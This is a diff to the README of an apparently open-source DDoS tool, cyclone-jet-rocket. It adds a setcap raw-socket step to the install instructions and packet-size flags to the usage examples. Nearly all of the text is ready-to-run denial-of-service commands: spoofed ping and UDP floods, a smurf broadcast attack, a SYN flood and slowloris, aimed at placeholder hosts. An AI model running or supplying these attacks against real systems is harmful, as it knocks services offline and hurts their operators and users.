@@ -9,6 +9,7 @@ This DDoS tool provides more than 8 kinds of attack methods, each in one module,
 ```
 go get github.com/crazyboycjr/cyclone-jet-rocket
 go build -o $GOPATH/bin/cjr github.com/crazyboycjr/cyclone-jet-rocket
+sudo setcap cap_net_raw+ep $GOPATH/bin/cjr
 ```
 
 ## Usage
@@ -18,9 +19,9 @@ stand-alone mode
 cjr --help
 cjr --list-module
 cjr --module ping-flood help
-cjr -m ping-flood --spoof 192.168.1.0/24 --destination 192.168.1.3 --rate 100/ms -c 100000
-cjr -m udp-flood -s 192.168.0.0/16 -d 192.168.1.3 -p 80 -p 22 -p 8000:9000 -r nolimit
-cjr -m smurf --broadcast 192.168.1.255 -d 192.168.1.3 -c 1000
+cjr -m ping-flood --spoof 192.168.1.0/24 --destination 192.168.1.3 --rate 100/ms -c 100000 --size 1472
+cjr -m udp-flood -s 192.168.0.0/16 -d 192.168.1.3 -p 80 -p 22 -p 8000:9000 -r nolimit --size 1200
+cjr -m smurf --broadcast 192.168.1.255 -d 192.168.1.3 -c 1000 --size 1000
 cjr -m syn-flood -s 192.168.2.0/24 -d 192.168.1.3 -p 80 -r 100/s
 cjr -m slowloris --url http://www.example.com --request GET -c 100 -r 1/s --timeout 10
 cjr -m slowloris -u http://www.example.com -X POST -c 100 -r 10/s --t 20
